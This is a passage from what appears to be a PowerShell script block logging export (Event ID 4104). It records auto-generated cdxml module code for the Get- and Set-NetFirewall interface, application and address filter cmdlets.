    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallRule') -and (@('ByAssociatedNetFirewallRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallRule}, 'MSFT_NetFirewallRuleFilterByInterface', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleFilterByInterface', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallInterfaceFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallInterfaceFilter' -Alias '*'
        

function Set-NetFirewallInterfaceFilter
{
    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]

    param(
    
    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${InterfaceAlias},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('InterfaceAlias')) {
            [object]$__cmdletization_value = ${InterfaceAlias}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InterfaceAlias'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InterfaceAlias'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallInterfaceFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallInterfaceFilter' -Alias '*'
        


ScriptBlock ID: a316702f-5275-455e-8f85-a145b3ab93ec
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetApplicationFilter'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallApplicationFilter
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetApplicationFilter')]

    param(
    
    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Program},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Package},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Program') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Program})
        $__cmdletization_queryBuilder.FilterByProperty('AppPath', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Package') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Package})
        $__cmdletization_queryBuilder.FilterByProperty('Package', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallRule') -and (@('ByAssociatedNetFirewallRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallRule}, 'MSFT_NetFirewallRuleFilterByApplication', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallApplicationFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallApplicationFilter' -Alias '*'
        

function Set-NetFirewallApplicationFilter
{
    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetApplicationFilter')]

    param(
    
    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetApplicationFilter')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Program},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Package},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Program')) {
            [object]$__cmdletization_value = ${Program}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AppPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AppPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Package')) {
            [object]$__cmdletization_value = ${Package}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Package'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Package'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallApplicationFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallApplicationFilter' -Alias '*'
        


ScriptBlock ID: f57b7574-e85c-4c87-9c9c-7d6e63dbbb74
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetAddressFilter'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallAddressFilter
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]

    param(
    
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallRule') -and (@('ByAssociatedNetFirewallRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallRule}, 'MSFT_NetFirewallRuleFilterByAddress', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleFilterByAddress', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleFilterByAddress', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallAddressFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallAddressFilter' -Alias '*'
        

function Set-NetFirewallAddressFilter
{
    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]

    param(
    
    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('LocalIP')]
    [string[]]
    ${LocalAddress},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('RemoteIP')]
    [string[]]
    ${RemoteAddress},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
